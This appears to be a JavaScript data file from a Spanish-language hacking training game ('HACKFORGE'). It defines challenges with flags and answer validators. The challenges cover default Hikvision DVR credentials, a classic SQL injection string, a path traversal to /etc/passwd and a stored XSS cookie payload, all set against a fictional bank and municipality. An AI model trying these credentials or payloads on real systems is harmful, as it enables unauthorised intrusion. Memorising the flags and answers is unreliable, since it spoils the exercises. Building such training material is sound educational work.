        "Ve a la lección 5/5 en Teoría y abre el panel de cámaras interactivo",
        "Identifica el fabricante: Hikvision DVR — sistema muy común en CCTV",
        "Consulta la documentación pública: Hikvision tiene credenciales muy conocidas",
        "Prueba las combinaciones más comunes: admin/admin, admin/12345, admin/1234",
        "Una vez dentro, registra el acceso en el campo de abajo"
      ],
      hint:"Hikvision DVR usa credenciales extremadamente simples y documentadas públicamente en su manual oficial.",
      ph:"usuario:contraseña (ej: admin:12345)",
      flag:"HACKFORGE{d3f4ult_cr3ds_0wn3d}",
      ok:(v)=>{ const n=v.toLowerCase(); return ["admin:12345","admin:admin","admin:1234","root:12345","admin:password"].some(c=>n===c||n.includes(c)); },
      msg:"✅ Acceso concedido. Las 50 cámaras del municipio están comprometidas — credenciales nunca cambiadas desde la instalación.",
    }
  },
];

export const FINAL = {
  objectives:[
    {icon:"🔑", title:"Acceso inicial",          tech:"Credenciales Default", desc:"Panel de soporte técnico del banco — nunca cambiaron las credenciales de fábrica", ph:"admin:1234 o similar", ok:(v)=>["admin:admin","admin:1234","root:root","admin:password"].some(c=>v.toLowerCase().includes(c))},
    {icon:"💉", title:"Escalada de privilegios", tech:"SQL Injection",        desc:"Buscador interno de clientes — query construida por concatenación de strings",   ph:"' OR 1=1-- o similar", ok:(v)=>v.includes("'")&&(v.toLowerCase().includes("or")||v.includes("--"))},
    {icon:"📂", title:"Exfiltración de datos",   tech:"Path Traversal",       desc:"Módulo de logs del sistema — parámetro file= sin validación de ruta",            ph:"../../../etc/passwd", ok:(v)=>v.includes("../")&&(v.toLowerCase().includes("passwd")||v.toLowerCase().includes("env"))},
    {icon:"👾", title:"Persistencia",            tech:"XSS Almacenado",       desc:"Sistema de tickets de soporte — comentarios renderizados con innerHTML",          ph:"<script>alert(document.cookie)</script>", ok:(v)=>(v.includes("<script>")||v.toLowerCase().includes("onerror"))&&(v.toLowerCase().includes("alert")||v.toLowerCase().includes("cookie"))},
  ],
  flag:"HACKFORGE{n3xus_b4nk_0p3r4t10n_c0mpl3t3}",
  xp: 500,
  badge:"🏆 Básico Completado",
};